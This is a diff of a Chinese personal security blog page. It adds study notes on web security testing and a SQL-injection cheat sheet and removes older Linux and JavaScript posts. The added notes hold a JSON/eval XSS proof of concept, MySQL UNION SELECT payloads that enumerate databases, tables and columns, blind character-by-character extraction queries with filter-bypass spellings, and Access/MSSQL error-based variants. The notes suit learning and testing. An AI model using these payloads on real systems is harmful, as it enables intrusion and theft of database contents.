@@ -78,6 +78,142 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/11/13/2015/book-web安全测试/" title="读书笔记--web安全测试" itemprop="url">读书笔记--web安全测试</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-12T16:00:00.000Z" itemprop="datePublished"> 发表于 11-13-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h3 id="wget_作镜像">wget 作镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http://a.com -r -R <span class="string">'*.gif,*.jpg,*.png,*.css,*.js'</span></span><br><span class="line">wget http://b.com -r -A <span class="string">'*.html,*.htm,*.php,*.asp,*.aspx,*.jsp,*do'</span></span><br></pre></td></tr></table></figure>
+<p>-r 递归扫描 —depth 1 只扫到一级目录<br>-A  accept 接受的文件类型<br>-R  reject  拒绝的文件类型<br>—http-user —http-password   身份认证<br>—save-cookies  —load-cookies    存储/加载cookies<br>—log   存储日志</p>
+<h3 id="openSSL_的base64">openSSL 的base64</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#decode</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">'b3BlbnNzbA=='</span> | openssl base64 <span class="operator">-d</span>   <span class="comment">#-d decode</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">'openssl'</span> | openssl base64 <span class="operator">-e</span>   <span class="comment">#-e encode</span></span><br><span class="line"><span class="comment">#注意 -n必需        -n就表示不输入回车符</span></span><br><span class="line"><span class="comment">#code with file</span></span><br><span class="line">openssl base64 <span class="operator">-e</span>/<span class="operator">-d</span> -in   input.txt  -out output.txt</span><br></pre></td></tr></table></figure>
+<p>cookie 一般使用base64编码</p>
+<p>openssl还<code>支持rsa md2 md5 sha sha1 sha224 sha256 sha384 sha512 des3</code>编码,棒!</p>
+<h4 id="openssl_md5">openssl_md5</h4><p>a.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a</span></span><br><span class="line"><span class="number">1</span>. openssl </span><br><span class="line"><span class="number">2</span>. 输入md5后回车</span><br><span class="line"><span class="number">3</span>. 接着输入<span class="number">123456</span>,不要输入回车.然后按<span class="number">3</span>次ctrl+d.</span><br><span class="line"><span class="number">4</span>. 输出密文</span><br><span class="line"><span class="comment">#b</span></span><br><span class="line"> <span class="built_in">echo</span> -n <span class="number">123456</span> | openssl md5</span><br></pre></td></tr></table></figure></p>
+<p>其他同理~</p>
+<h4 id="小游戏">小游戏</h4><p><a href="http://fun.coolshell.cn/tree.html" target="_blank" rel="external">Binary Tree</a><br>手画画了好久..</p>
+<h3 id="JSON_attack_xss">JSON attack xss</h3><p>应该算是个存储型吧<br>AJAX组件通过JavaScript对象符号JSON来接受输入,即<code>JSON内的数据接受javascript的解析</code></p>
+<h4 id="JSON解析原理:">JSON解析原理:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse()</span><br><span class="line"><span class="comment">//解析JSON字符串, 可以选择改变前面解析后的值及其属性,然后返回解析的值.</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify()</span><br><span class="line"><span class="comment">//返回指定值的 JSON 字符串,可以自定义只包含某些特定的属性或替换属性值.</span></span><br><span class="line"><span class="keyword">var</span> code = <span class="string">'"nihao"'</span>;</span><br><span class="line"><span class="built_in">JSON</span>.parse(code);</span><br><span class="line"><span class="built_in">eval</span>(code);</span><br></pre></td></tr></table></figure>
+<h4 id="example:">example:</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "<span class="attribute">menu</span>":</span><br><span class="line">  <span class="value">&#123;</span><br><span class="line">    "<span class="attribute">address</span>":</span><br><span class="line">    <span class="value">&#123;</span><br><span class="line">      "<span class="attribute">line1</span>":<span class="value"><span class="string">"User Inputs"</span></span>,</span><br><span class="line">      "<span class="attribute">line2</span>":<span class="value"><span class="string">"Beijing"</span></span>,</span><br><span class="line">      "<span class="attribute">line3</span>":<span class="value"><span class="string">"Shanghai"</span></span><br><span class="line">    </span>&#125;</span><br><span class="line">  </span>&#125;</span><br><span class="line"></span>&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="POC:">POC:</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- User Inputs: --&gt;</span><br><span class="line">",                        //闭合</span><br><span class="line">xxx1:alert(/xss/),    //xxx1,xxx2则为语法需要,任意即可</span><br><span class="line">xxx2:"        //闭合</span><br></pre></td></tr></table></figure>
+<h4 id="解析之后">解析之后</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(&#123;</span><br><span class="line">  <span class="string">"menu"</span>:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">"address"</span>:</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">"line1"</span>:<span class="string">""</span>,xxx1:alert(<span class="regexp">/xss/</span>),xxx2:<span class="string">" "</span>,</span><br><span class="line">      <span class="string">"line2"</span>:<span class="string">"Beijing"</span>,</span><br><span class="line">      <span class="string">"line3"</span>:<span class="string">"Shanghai"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>Other :<br>查找网站平台/框架<br>  <meta>  注释 页头信息(header)</p>
+<h3 id="Pending">Pending</h3><ol>
+<li>curl 自动化xss检测 &amp;&amp; 目录遍历    P137 单独blog</li>
+<li>Command Injection</li>
+<li>Xpath Injection</li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/13/2015/book-web安全测试/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/13/2015/book-web安全测试/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/11/12/2015/sql爆表/" title="MySQL表段,字段查询" itemprop="url">MySQL表段,字段查询</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2015-11-11T16:00:00.000Z" itemprop="datePublished"> 发表于 11-12-2015</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="information_schema数据库结构">information_schema数据库结构</h2><h3 id="information_schema-tables">information_schema.tables</h3><p><code>数据库和表tables的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------+</span></span><br><span class="line"><span class="header">|----所有数据库名 ------- 所有的表名 -------|   </span><br><span class="line">+----------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="information_schema-columns">information_schema.columns</h3><p><code>数据库,表和字段columns的关系库</code><br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+----TABLE_SCHEMA-------TABLE_NAME-------COLUMN_NAME-----+</span></span><br><span class="line"><span class="header">|----所有数据库名 ------- 所有的表名 ------ 所有的字段名 ----|</span><br><span class="line">+--------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="mysql-user">mysql.user</h2><p>数据库连接所检测的帐号密码<br><code>Host</code> <code>User</code> <code>Password</code></p>
+<h2 id="mysql">mysql</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">by blackbap.org</span><br><span class="line">爆所有数据库名：</span><br><span class="line"> union <span class="operator"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_schema) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span></span><br><span class="line">爆所有表段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_namer) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema(表名)=<span class="number">0x64625F6368696E615F717562616E5F636E</span>      //表名写成<span class="number">16</span>进制就不需要添加单引号了</span><br><span class="line">爆admin表里面所有字段名称：</span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> column_name) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name=<span class="number">0x61646D696E</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="insert类型注入">insert类型注入</h2><p>例如文件上传中的文件名注入.etc</p>
+<h3 id="0x01_爆版本号">0x01 爆版本号</h3><p>[‘+]  concat( (select version() ))  [+’]</p>
+<h3 id="0x02_爆数据库(逐字)">0x02 爆数据库(逐字)</h3><ol>
+<li><p>长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( <span class="operator"><span class="keyword">select</span> length(<span class="keyword">database</span>()) )+<span class="string">'</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>逐字爆库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">'+concat( ( selecselectt ascii((substr(database(),1,1))) ) )+'</span><br><span class="line">'+concat( ( selecselectt ascii((substr(database(),2,1))) ) )+'</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>….etc</p>
+<h3 id="0x03_逐字爆表—查表原理">0x03 逐字爆表—查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">concat( (</span><br><span class="line">  <span class="operator"><span class="keyword">select</span> <span class="keyword">ascii</span>(</span><br><span class="line">    <span class="keyword">substr</span>(</span><br><span class="line">      (selselectect table_name frfromom information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">      ,<span class="number">1</span>,<span class="number">1</span>)) ) )</span><br><span class="line"><span class="comment">-- limit 0,1 是因为数据库可能会有很多表,limit限制显示的行数</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> 即可查第二个表,后面同理</span></span><br></pre></td></tr></table></figure>
+<h3 id="0x04_逐字爆字段—查表原理">0x04 逐字爆字段—查表原理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">concat((</span><br><span class="line">  <span class="operator"><span class="keyword">select</span> <span class="keyword">ascii</span>( </span><br><span class="line">      <span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> table_name = <span class="string">'爆出来的表名'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    ,<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line">  ))</span></span><br></pre></td></tr></table></figure>
+<h2 id="access:">access:</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#top x:      选取前面x行  非Mysql语法,mysql可以用limit代替</span><br><span class="line">1=convert(int,(<span class="operator"><span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span>))</span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'第一个表名'</span>)))</span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span>+top+<span class="number">1</span>+table_name+<span class="keyword">from</span>+information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'第二个表名'</span>,<span class="string">'第一个表名'</span>)))</span></span><br></pre></td></tr></table></figure>
+<p>可以学习过滤语句 <code>where 字段名 not in(&#39;xxx1&#39;,&#39;xxx2&#39;[,&#39;xxxn&#39;]);</code></p>
+<h2 id="报错情况下的mysql—-待补充">报错情况下的mysql—-待补充</h2><ol>
+<li>获取当前用户名</li>
+<li></li>
+</ol>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/11/12/2015/sql爆表/#comments" class="ds-thread-count comments-count-link" data-thread-key="11/12/2015/sql爆表/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/11/10/2015/mysqlDvwa/" title="DVWA-SQLInject" itemprop="url">DVWA-SQLInject</a>
   </h1>
   <p class="article-author">By
@@ -567,140 +703,6 @@ noauto          开机不自动挂载
 
 
 
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/14/2015/bash1/" title="Linux 查询" itemprop="url">Linux 查询</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-13T16:00:00.000Z" itemprop="datePublished"> 发表于 10-14-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="文件类型">文件类型</h2><blockquote>
-<p>file ~/.bashrc</p>
-</blockquote>
-<h2 id="可执行文件">可执行文件</h2><p>-a all 找出所有的,有时候需要root权限查找例如<code>ifconfig</code></p>
-<blockquote>
-<p>which -a java</p>
-</blockquote>
-<h2 id="文件名">文件名</h2><h3 id="1-whereis_[-bmsu]_file/folder">1.whereis [-bmsu] file/folder</h3><p>—-依赖数据库—-<br>-b 二进制 -m manual路径下的文件(说明文件) -s 源文件<br>-u except above three</p>
-<blockquote>
-<p>whereis ifconfig<br>whereis -m passwd</p>
-</blockquote>
-<h3 id="2-locate_[-ir]_keyword">2.locate [-ir] keyword</h3><p>—-依赖数据库—-<br>-i 忽略大小写<br>-r regexp正则</p>
-<blockquote>
-<p>locate -i PAssWd</p>
-</blockquote>
-<p>手动更新数据库—&gt;<code>updatedb</code></p>
-<h3 id="3-_find_[Router]_[option]_[action]">3. find [Router] [option] [action]</h3><p>—-直接查找硬盘—-<br>find查找`默认递归</p>
-<h4 id="指定路径">指定路径</h4><p>排除<code>/media</code>和<code>/lib</code>路径查询包含<code>application</code>字样的文件<br><strong>注意</strong>,()需要转义 -i忽略大小写<br>&gt;<br>sudo find /  ( -path /media -o -path /lib ) -prune -o -iname “application” -print </p>
-<p>Reference: <a href="http://blog.csdn.net/imfinger/article/details/6371601" target="_blank" rel="external">lionfun</a></p>
-<h4 id="时间">时间</h4><p>-atime -ctime -mtime<br><img src="/imgs/bash/linux-find-time.png" alt="1"><br>图示为<code>mtime</code>选项,作图过程中忍不住安利个网站- -<a href="https://www.processon.com" target="_blank" rel="external">ProcessOn</a><br>24小时之内tools文件夹更改的地方</p>
-<blockquote>
-<p>find / -mtime 0. </p>
-</blockquote>
-<h4 id="文件名/文件类型">文件名/文件类型</h4><p>在当前目录进行递归查找名为’filename’的任意扩展文件</p>
-<blockquote>
-<p>find . -name ‘filename.*’<br>find ~ -type s<br>type缩写===&gt;<a href="http://man.linuxde.net/find" target="_blank" rel="external">linuxde</a></p>
-</blockquote>
-<h2 id="文件内容">文件内容</h2><h3 id="grep_[-acinv]_[—color=auto]_‘words’_file">grep [-acinv] [—color=auto] ‘words’ file</h3><p>常用: -r 递归 -n 行号 -v 反向 -i 无视大小写<br>栗子:</p>
-<blockquote>
-<p>grep “contents” . -r -n</p>
-</blockquote>
-<h3 id="更多grep写在了这边==&gt;鸟哥读书记">更多grep写在了这边==&gt;<a href="http://a1exlism.github.io/#stq=grep+%E6%AD%A3%E5%88%99&amp;stp=1" target="_blank" rel="external">鸟哥读书记</a></h3><h3 id="find_grep_组合技查询">find grep 组合技查询</h3><p>从当前目录下找到有关’port’的ini文件</p>
-<blockquote>
-<p>$ find -name *.ini | xargs grep port</p>
-</blockquote>
-<h2 id="Reference">Reference</h2><p><a href="http://www.cnblogs.com/skynet/archive/2010/12/25/1916873.html" target="_blank" rel="external">吴秦(Tyler)</a><br><a href="http://www.ai7.org/wp/html/653.html" target="_blank" rel="external">男单 618</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/14/2015/bash1/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/14/2015/bash1/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/10/13/2015/ClientJS-6/" title="Js学习笔记(6)" itemprop="url">Js学习笔记(6)</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2015-10-12T16:00:00.000Z" itemprop="datePublished"> 发表于 10-13-2015</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="HTML表单">HTML表单</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//筛选特定id,特定属性的表单input元素</span></span><br><span class="line"><span class="built_in">document</span>.querySelectorAll(<span class="string">'#id input[type="putin]'</span>);</span><br></pre></td></tr></table></figure>
-<h4 id="文件上传">文件上传</h4><p><input type="file">该元素的value属性为只读</p>
-<h3 id="Document属性">Document属性</h3><p>cookie domain location(window共用) referrer(引导) URL tutle lastModified</p>
-<h4 id="判断referrer并响应">判断referrer并响应</h4><h5 id="所用函数">所用函数</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stringObject.split(separator,howmany)  <span class="comment">//分隔符,返回string数组类型(无分隔符)</span></span><br><span class="line">indexOf(searchvalue,fromindex)  <span class="comment">//返回第一次见到searchvalue时候的位置</span></span><br><span class="line">stringObject.substring(start,stop)  <span class="comment">//字符串提取</span></span><br><span class="line"><span class="built_in">unescape</span>(string) <span class="comment">//stringURL解码</span></span><br></pre></td></tr></table></figure>
-<h5 id="栗子:">栗子:</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ref = <span class="built_in">document</span>.referrer;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.referrer.indexOf(<span class="string">"https://www.google.com/search?"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">   <span class="keyword">var</span> args = <span class="built_in">document</span>.referrer.substring(ref.indexOf(<span class="string">"?"</span>)+<span class="number">1</span>).split(<span class="string">"&amp;"</span>) ; <span class="comment">//args为以&amp;为分解符的string数组</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; args.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (args[i].substring(<span class="number">0</span>,<span class="number">2</span>) == <span class="string">"q="</span>)</span><br><span class="line">            <span class="built_in">document</span>.write(<span class="string">"You are searching for: "</span> + <span class="built_in">unescape</span>(args[i].substring(<span class="number">2</span>)).replace(<span class="string">'+'</span>, <span class="string">' '</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/13/2015/ClientJS-6/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/13/2015/ClientJS-6/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
     <a class="extend prev" rel="prev" href="/page/3/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">Next<span></span></a>
@@ -717,7 +719,7 @@ noauto          开机不自动挂载
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/Android/" style="font-size: 16.67px;">Android</a> <a href="/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/tags/Collection/" style="font-size: 10px;">Collection</a> <a href="/tags/G4W/" style="font-size: 11.67px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Nexus-5x/" style="font-size: 13.33px;">Nexus-5x</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Shell/" style="font-size: 18.33px;">Shell</a> <a href="/tags/Web/" style="font-size: 11.67px;">Web</a> <a href="/tags/Wifi/" style="font-size: 10px;">Wifi</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/XSS/" style="font-size: 13.33px;">XSS</a> <a href="/tags/daily/" style="font-size: 16.67px;">daily</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/touchpad/" style="font-size: 10px;">touchpad</a> <a href="/tags/书记/" style="font-size: 15px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
+       <a href="/tags/Android/" style="font-size: 15.71px;">Android</a> <a href="/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/tags/Collection/" style="font-size: 10px;">Collection</a> <a href="/tags/G4W/" style="font-size: 11.43px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 18.57px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 14.29px;">MySQL</a> <a href="/tags/Nexus-5x/" style="font-size: 12.86px;">Nexus-5x</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Shell/" style="font-size: 17.14px;">Shell</a> <a href="/tags/Web/" style="font-size: 11.43px;">Web</a> <a href="/tags/Wifi/" style="font-size: 10px;">Wifi</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/XSS/" style="font-size: 12.86px;">XSS</a> <a href="/tags/daily/" style="font-size: 15.71px;">daily</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/touchpad/" style="font-size: 10px;">touchpad</a> <a href="/tags/书记/" style="font-size: 15.71px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
     </div>
   </div>
 
@@ -725,7 +727,7 @@ noauto          开机不自动挂载
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
@@ -763,7 +765,7 @@ noauto          开机不自动挂载
 		  
 		
 		  
-			<li><a href="/categories/Web/" title="Web">Web<sup>19</sup></a></li>
+			<li><a href="/categories/Web/" title="Web">Web<sup>21</sup></a></li>
 		  
 		
 		  
